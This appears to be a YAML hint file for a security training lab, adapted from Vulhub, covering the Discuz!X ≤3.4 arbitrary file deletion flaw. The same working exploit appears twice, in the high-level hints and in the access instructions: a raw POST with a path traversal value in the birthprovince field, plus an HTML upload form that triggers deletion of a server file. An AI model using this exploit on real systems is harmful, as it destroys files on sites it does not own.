@@ -1,0 +1,172 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: discuz/x3.4-arbitrary-file-deletion
+hint_levels:
+  low:
+  - Inspect the discuz service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 80. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 80 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): discuz: 80/tcp → container 80/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}/robots.txt`.'
+  high:
+  - 'Vulnerability: Discuz!X ≤3.4 Arbitrary File Deletion.'
+  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
+    substitutions.
+  - |-
+    Vulnerability Reproduction
+
+    First, verify that the target file (e.g., robots.txt) exists by visiting `http://{{NODE_IP}}/robots.txt`:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/discuz/x3.4-arbitrary-file-deletion/2.png
+
+    After registering a user account, find your formhash value in the personal settings page:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/discuz/x3.4-arbitrary-file-deletion/4.png
+
+    Send the following HTTP request with your cookie and formhash:
+
+    ```
+    POST /home.php?mod=spacecp&ac=profile&op=base HTTP/1.1
+    Host: {{NODE_IP}}
+    Cache-Control: max-age=0
+    Upgrade-Insecure-Requests: 1
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPFvXyxL45f34L12s
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
+    Cookie: [your cookie]
+    Connection: close
+
+    ------WebKitFormBoundaryPFvXyxL45f34L12s
+    Content-Disposition: form-data; name="formhash"
+
+    [your formhash]
+    ------WebKitFormBoundaryPFvXyxL45f34L12s
+    Content-Disposition: form-data; name="birthprovince"
+
+    ../../../robots.txt
+    ------WebKitFormBoundaryPFvXyxL45f34L12s
+    Content-Disposition: form-data; name="profilesubmit"
+
+    1
+    ------WebKitFormBoundaryPFvXyxL45f34L12s--
+    ```
+
+    After successful submission, the birthplace field in the user profile page will show the following state:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/discuz/x3.4-arbitrary-file-deletion/5.png
+
+    This indicates that our malicious data has been inserted into the database.
+
+    Next, create an `upload.html` file with the following code (replace `[{{NODE_IP}}]` with your Discuz domain and `[form-hash]` with your formhash):
+
+    ```html
+    <body>
+        <form action="http://[{{NODE_IP}}]/home.php?mod=spacecp&ac=profile&op=base&profilesubmit=1&formhash=[form-hash]" method="post" enctype="multipart/form-data">
+            <input type="file" name="birthprovince" />
+            <input type="submit" value="upload" />
+        </form>
+    </body>
+    ```
+
+    Open this page in a browser and upload a normal image file. At this point, the malicious data should have been processed and the vulnerability exploitation is complete.
+
+    Visit `http://{{NODE_IP}}/robots.txt` again to verify that the file has been successfully deleted:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/discuz/x3.4-arbitrary-file-deletion/6.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/discuz/x3.4-arbitrary-file-deletion/README.md'
+  - |-
+    Additional public references:
+    - https://lorexxar.cn/2017/09/30/dz-delete/
+access_instructions:
+  title: Discuz!X ≤3.4 Arbitrary File Deletion
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 80. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 80 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): discuz: 80/tcp → container 80/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}/robots.txt`.
+  - title: Vulnerability Reproduction
+    instructions: |-
+      First, verify that the target file (e.g., robots.txt) exists by visiting `http://{{NODE_IP}}/robots.txt`:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/discuz/x3.4-arbitrary-file-deletion/2.png
+
+      After registering a user account, find your formhash value in the personal settings page:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/discuz/x3.4-arbitrary-file-deletion/4.png
+
+      Send the following HTTP request with your cookie and formhash:
+
+      ```
+      POST /home.php?mod=spacecp&ac=profile&op=base HTTP/1.1
+      Host: {{NODE_IP}}
+      Cache-Control: max-age=0
+      Upgrade-Insecure-Requests: 1
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPFvXyxL45f34L12s
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+      Accept-Encoding: gzip, deflate
+      Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
+      Cookie: [your cookie]
+      Connection: close
+
+      ------WebKitFormBoundaryPFvXyxL45f34L12s
+      Content-Disposition: form-data; name="formhash"
+
+      [your formhash]
+      ------WebKitFormBoundaryPFvXyxL45f34L12s
+      Content-Disposition: form-data; name="birthprovince"
+
+      ../../../robots.txt
+      ------WebKitFormBoundaryPFvXyxL45f34L12s
+      Content-Disposition: form-data; name="profilesubmit"
+
+      1
+      ------WebKitFormBoundaryPFvXyxL45f34L12s--
+      ```
+
+      After successful submission, the birthplace field in the user profile page will show the following state:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/discuz/x3.4-arbitrary-file-deletion/5.png
+
+      This indicates that our malicious data has been inserted into the database.
+
+      Next, create an `upload.html` file with the following code (replace `[{{NODE_IP}}]` with your Discuz domain and `[form-hash]` with your formhash):
+
+      ```html
+      <body>
+          <form action="http://[{{NODE_IP}}]/home.php?mod=spacecp&ac=profile&op=base&profilesubmit=1&formhash=[form-hash]" method="post" enctype="multipart/form-data">
+              <input type="file" name="birthprovince" />
+              <input type="submit" value="upload" />
+          </form>
+      </body>
+      ```
+
+      Open this page in a browser and upload a normal image file. At this point, the malicious data should have been processed and the vulnerability exploitation is complete.
+
+      Visit `http://{{NODE_IP}}/robots.txt` again to verify that the file has been successfully deleted:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/discuz/x3.4-arbitrary-file-deletion/6.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/discuz/x3.4-arbitrary-file-deletion/README.md
+  readme_sha256: ea5b3db175e41e788fc01d51fee6d3fef90ac181887f09e55e9456581d9178ee
+  compose_sha256: 783ba99822e3bd2c1f8408001eaaeb3a527c286f6daf1bf7194718680b3ffc3f
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
